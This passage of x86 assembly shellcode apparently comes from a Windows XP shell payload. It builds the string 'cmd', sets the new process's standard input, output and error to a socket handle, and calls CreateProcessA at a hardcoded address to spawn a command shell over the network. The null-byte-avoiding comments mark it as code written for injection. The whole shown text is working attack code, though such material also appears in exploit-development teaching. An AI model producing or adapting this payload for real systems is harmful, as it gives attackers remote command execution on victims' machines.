mov ebx,0x646d6341      ; Move 'cmda' to EBX. The trailing 'a' is to avoid injecting null bytes.
shr ebx,0x8             ; Make EBX = 'cmd\x00'
push ebx                ; Push application name
mov ecx,esp             ; Make ECX a pointer to the 'cmd' command ('lpCommandLine' parameter)

; Now fill the `_STARTUPINFOA` structure
xor edx,edx             ; Zero out EDX
push esi                ; hStdError = our socket handler
push esi                ; hStdOutput = our socket handler
push esi                ; hStdInput = our socket handler
push edx                ; cbReserved2 = NULL
push edx                ; wShowWindow = NULL
xor eax, eax            ; Zero out EAX
mov ax,0x0101           ; dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
push eax                ; Push dwFlags
push edx                ; dwFillAttribute = NULL
push edx                ; dwYCountChars = NULL
push edx                ; dwXCountChars = NULL
push edx                ; dwYSize = NULL
push edx                ; dwXSize = NULL
push edx                ; dwY = NULL
push edx                ; dwX = NULL
push edx                ; lpTitle = NULL
push edx                ; lpDesktop = NULL
push edx                ; lpReserved = NULL
add dl,44               ; cb = 44
push edx                ; Push _STARTUPINFOA on stack
mov eax,esp       	; Make EAX a pointer to _STARTUPINFOA
xor edx,edx             ; Zero out EDX again

; Fill PROCESS_INFORMATION struct
push edx                ; lpProcessInformation
push edx                ; lpProcessInformation + 4
push edx                ; lpProcessInformation + 8
push edx                ; lpProcessInformation + 12


; Now fill out the `CreateProcessA` parameters
push esp                ; lpProcessInformation
push eax                ; lpStartupInfo
xor ebx,ebx             ; Zero out EBX to fill other parameters
push ebx                ; lpCurrentDirectory
push ebx                ; lpEnvironment
push ebx                ; dwCreationFlags
inc ebx                 ; bInheritHandles = True
push ebx                ; Push bInheritHandles
dec ebx                 ; Make EBX zero again
push ebx                ; lpThreadAttributes
push ebx                ; lpProcessAttributes
push ecx                ; lpCommandLine = Pointer to 'cmd\x00'
push ebx                ; lpApplicationName
mov ebx,0x7c80236b      ; Address of CreateProcessA()
call ebx                ; Call CreateProcessA() on WinXPSP

